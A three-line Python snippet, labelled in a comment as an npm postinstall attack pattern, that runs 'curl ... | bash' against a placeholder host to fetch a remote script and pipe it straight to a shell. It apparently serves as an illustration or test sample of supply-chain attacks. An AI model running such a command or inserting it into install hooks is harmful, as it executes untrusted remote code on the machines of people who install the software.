# Public npm postinstall attack pattern: remote code piped to a shell.
import subprocess
subprocess.run("curl -fsSL https://example.invalid/bootstrap.sh | bash", shell=True)
